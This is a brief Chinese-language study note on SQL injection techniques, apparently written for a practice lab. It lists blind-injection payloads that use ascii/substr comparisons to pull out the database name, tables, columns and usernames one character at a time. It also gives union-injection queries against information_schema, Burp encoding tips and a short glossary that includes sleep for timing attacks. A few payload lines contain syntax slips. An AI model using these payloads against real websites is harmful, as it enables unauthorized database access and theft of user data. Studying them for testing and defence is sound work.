由于sql不区分大小写，所以爆破容易产生大小写混乱，我们可以加入ascii进行转换

在burp中空格要用%20或者+替代

```
查询数据库名长度
length(database())=1

查询数据库名
ascii(substr((select database()),1,1))=ascii('a')

查询数据库下表的名称
ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=ascii('a')


查询数据库下列的名称
ascii(substr((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit,0,1),1,1))=ascii('a')

查询数据库下各列对应的值
ascii(substr((select username from users limit,0,1 ),1,1))=ascii('a')
```



```
limit函数
limit 第几行，第几个数据

if()函数
if(条件,成立执行,不成立执行)

substr()函数
substr(字符串,起始位置,截取长度)

left()函数
left(字符串,左数第几位)

sleep函数
sleep(睡眠时间s)
```













布尔盲注

布尔盲注利用输入信息的回显进行判断，一般输入正确会出现一个值，输入错误会出现一个值

时间盲注

时间盲注基于无论输入是否正确都显示同样的内容，我们利用sleep函数进行检测输入是否正确

报错盲注

联合注入

联合注入就是测试输入点然后利用语句输出你想要查询的东西

```
查询数据库名
select database()

查询数据库下表的名称
select table_name from information_schema.tables where table_schema='security' limit 0,1


查询数据库下列的名称
select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1

查询数据库下各列对应的值
select username from users limit 0,1 
```





